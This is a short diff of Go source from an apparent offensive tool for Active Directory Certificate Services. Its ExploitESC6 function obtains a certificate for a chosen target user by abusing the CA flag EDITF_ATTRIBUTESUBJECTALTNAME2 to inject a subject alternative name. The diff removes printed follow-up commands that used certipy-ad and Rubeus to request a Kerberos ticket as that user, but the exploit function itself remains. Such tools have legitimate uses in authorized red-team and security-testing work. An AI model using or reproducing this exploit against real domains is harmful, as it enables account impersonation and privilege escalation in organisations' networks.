@@ -4,7 +4,6 @@ import (
 	"crypto"
 	"crypto/x509"
 	"fmt"
-	"strings"
 )
 
 // editfAttributeSubjectAltName2 is the EDITF_ATTRIBUTESUBJECTALTNAME2 flag bit
@@ -116,15 +115,7 @@ func ExploitESC6(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certifi
 		return nil, nil, fmt.Errorf("enrollment failed: %w", err)
 	}
 
-	upnUser := targetUPN
-	if idx := strings.Index(upnUser, "@"); idx > 0 {
-		upnUser = upnUser[:idx]
-	}
 	fmt.Printf("[+] Certificate obtained for %s via ESC6 on CA %q using template %q\n", targetUPN, findings[0].CAName, templateName)
 	fmt.Printf("[*] SAN injected via EDITF_ATTRIBUTESUBJECTALTNAME2 CA policy\n")
-	fmt.Printf("[*] Next steps:\n")
-	fmt.Printf("    certipy-ad auth -pfx %s.pfx -dc-ip <DC_IP> -domain %s\n", upnUser, cfg.Domain)
-	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s.pfx /ptt\n", targetUPN, upnUser)
-	fmt.Printf("    # Note: ESC6 works on ANY template — the CA processes the SAN attribute globally\n")
 	return cert, certKey, nil
 }
